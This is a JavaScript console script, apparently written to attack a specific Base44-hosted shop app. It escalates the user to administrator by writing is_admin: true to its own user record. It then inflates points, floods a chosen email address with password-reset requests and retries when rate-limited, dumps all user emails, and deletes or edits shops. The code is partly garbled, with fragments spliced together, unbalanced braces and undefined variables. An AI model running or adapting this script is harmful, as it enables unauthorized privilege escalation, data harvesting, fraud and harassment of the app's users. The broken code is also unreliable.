(function() {
  'use strict';

  const APP_ID = '68fae07084e427823f2b1fa3';

  // ---------- 輔助函數 ----------
  function getToken() {
    return localStorage.getItem('base44_access_token');
  }

  function getHeaders(extra = {}) {
    const token = getToken();
    return {
      'Authorization': token ? `Bearer ${token}` : '',
      'Content-Type': 'application/json',
      'X-App-Id': APP_ID,
      ...extra
    };
  }

  async function apiFetch(path, options = {}) {
    const url = `/api/apps/${APP_ID}${path}`;
    const res = await fetch(url, {
      ...options,
      headers: { ...getHeaders(), ...(options.headers || {}) }
    });
    const text = await res.text();
    let data;
    try { data = JSON.parse(text); } catch { data = text; }
    return { status: res.status, ok: res.ok, data };
  }

  async function getMe() {
    const res = await apiFetch('/entities/User/me');
    if (!res.ok) throw new Error('無法取得使用者資料');
    return res.data;
  }

  async function updateMe(payload) {
    const res = await apiFetch('/entities/User/me', {
      method: 'PUT',
      body: JSON.stringify(payload)
    });
    return res;
  }

  // ---------- 登入與權限檢查 ----------
  async function ensureLogin() {
    const token = getToken();
    if (!token) {
      alert('請先登入（Token 不存在）');
      return false;
    }
    try {
      await getMe();
      return true;
    } catch {
      alert('登入已過期，請重新登入');
      return false;
    }
  }

  async function ensureAdmin() {
    if (!(await ensureLogin())) return false;
    try {
      const me = await getMe();
      if (me.is_admin) {
        console.log('✅ 已經擁有管理員');
        return true;
      }
      const updated = { ...me, is_admin: true };
      const res = await updateMe(updated);
      if (res.ok && res.data.is_admin) {
        console.log('✅ 已成功提升為管理員！');
        return true;
      } else {
        console.error('❌ 提升管理員失敗，請手動檢查權限');
        return false;
      }
    } catch (e) {
      console.error('❌ 檢查權限時發生錯誤：' + e.message);
      return false;
    }
  }

  window.add_money = async function() {
    if (!(await ensureAdmin())) return;

    if (isNaN(amount) || amount < 0) return alert('請輸入有效正整數');

    me.points = (me.points || 0) + amount;

    } else {

  // ---------- 6. spam_mail ----------
  window.spam_mail = async function() {
    if (!(await ensureAdmin())) return;
    const email = prompt('請輸入目標 Email：');
    if (!email) return alert('未輸入 Email');
    let count = parseInt(prompt('請輸入騷擾次數：'));
    if (isNaN(count) || count < 1) return alert('次數無效');
    let success = 0, fail = 0;
    for (let i = 1; i <= count; i++) {
      try {
        const res = await apiFetch('/auth/reset-password-request', {
          method: 'POST',
          body: JSON.stringify({ email })
        });
        if (res.ok) {
          console.log(`✅ 第 ${i} 次成功`);
          success++;
        } else {
          console.warn(`❌ 第 ${i} 次失敗 (${res.status})`);
          fail++;
          if (res.status === 429) {
            console.log('⏳ 速率限制，等待 3 秒後重試...');
            await new Promise(r => setTimeout(r, 3000));
            i--;
            continue;
          }
        }
      } catch (e) {
        console.error(`⚠️ 第 ${i} 次異常:`, e.message);
        fail++;
      }
      await new Promise(r => setTimeout(r, 500));
    }
    alert(`🎯 騷擾完成！成功 ${success} 次，失敗 ${fail} 次`);
  };

    if (!(await ensureAdmin())) return;
    try {
      const res = await apiFetch('/entities/Notification?q={"user_email":{"$regex":".*"}}');
      if (!res.ok) {
        alert(`無法讀取通知：${res.status}`);
        return;
      }
      const data = res.data;
      if (!Array.isArray(data)) {
        alert('回應格式異常');
        return;
      }
      const emails = [...new Set(data.map(n => n.user_email).filter(Boolean))];
      console.log('📧 找到的使用者 Email:');
      emails.forEach(e => console.log(e));
      alert(`已列出 ${emails.length} 個 Email，請查看 Console`);
    } catch (e) {
      alert('錯誤：' + e.message);
    }
  };

  // ---------- 8. del_shop ----------
  window.del_shop = async function() {
    if (!(await ensureAdmin())) return;
    const response = await apiFetch('/entities/Shop');
    let list = response.data;
    // 處理可能的包裝結構
    if (!Array.isArray(list) && list && typeof list === 'object' && Array.isArray(list.data)) {
      list = list.data;
    }
    if (!Array.isArray(list) || !list.length) {
      alert('目前沒有商店');
      return;
    }
    list.forEach((s, i) => {
      console.log(`${i+1}. ${s.shop_name} (ID: ${s.id})`);
    });
    const idx = parseInt(prompt('請輸入要刪除的商店編號：')) - 1;
    if (isNaN(idx) || idx < 0 || idx >= list.length) {
      alert('無效編號');
      return;
    }
    const target = list[idx];
    if (!confirm(`確定要刪除商店「${target.shop_name}」嗎？`)) return;
    const res = await apiFetch(`/entities/Shop/${target.id}`, { method: 'DELETE' });
    if (res.ok) {
      alert('✅ 商店已刪除');
    } else {
      alert(`❌ 刪除失敗：${res.status}`);
    }

  // ---------- 10. mdf_shop ----------
  window.mdf_shop = async function() {
    if (!(await ensureAdmin())) return;
    const response = await apiFetch('/entities/Shop');
    let list = response.data;
    if (!Array.isArray(list) && list && typeof list === 'object' && Array.isArray(list.data)) {
      list = list.data;
    }
    if (!Array.isArray(list) || !list.length) {
      alert('目前沒有商店');
      return;
    }
    list.forEach((s, i) => {
      console.log(`${i+1}. ${s.shop_name} (ID: ${s.id})`);
    });
    const idx = parseInt(prompt('請輸入要修改的商店編號：')) - 1;
    if (isNaN(idx) || idx < 0 || idx >= list.length) {
      alert('無效編號');
      return;
    }
    const target = list[idx];
    console.log('目前資料:', target);

    const fields = [
      { key: 'shop_name', label: '商店名稱' },
      { key: 'shop_description', label: '商店描述' },
      { key: 'shop_avatar', label: '商店頭像 URL' },
      { key: 'owner_email', label: '店主信箱' },
      { key: 'rating', label: '評分 (1-5)' },
      { key: 'is_active', label: '啟用狀態 (true/false)' }
    ];
    for (const f of fields) {
      const current = target[f.key] ?? '';
      const input = prompt(`請輸入新的 ${f.label} (留空保持不變)：`, String(current));
      if (input !== null && input !== '') {
        if (f.key === 'rating') {
          target[f.key] = parseFloat(input) || current;
        } else if (f.key === 'is_active') {
          target[f.key] = input.toLowerCase() === 'true';
        } else {
          target[f.key] = input;
        }
      }
    }
    const res = await apiFetch(`/entities/Shop/${target.id}`, {
      method: 'PUT',
      body: JSON.stringify(target)
    });
    if (res.ok) {
      alert('✅ 商店資訊已更新');
    } else {
      alert(`❌ 更新失敗：${res.status}`);
    }
  };

  // ---------- 12. send_update_msg（改為 UpdateLog） ----------
  window.send_update_msg = async function() {
    if (!(await ensureAdmin())) return;
    const title = prompt('請輸入更新標題：');
    if (!title) return;
    const content = prompt('請輸入更新內容：');
    if (!content) return;
    const version = prompt('請輸入版本號（例如 v1.0.0）：');
    if (!version) return;
    const reward_points = parseInt(prompt('請輸入閱讀獎勵點數（0 表示無）：')) || 0;

    const res = await apiFetch('/entities/UpdateLog', {
      method: 'POST',
      body: JSON.stringify({
        title: title,
        content: content,
        version: version,
        reward_points: reward_points,
        is_active: true
      })
    });
    if (res.ok) {
      alert('✅ 更新公告已發送');
    } else {
      alert(`❌ 發送失敗：${res.status} - ${res.data?.message || ''}`);
    }

        admin_name: me.full_name || '管理員',

        is_active: true
      })
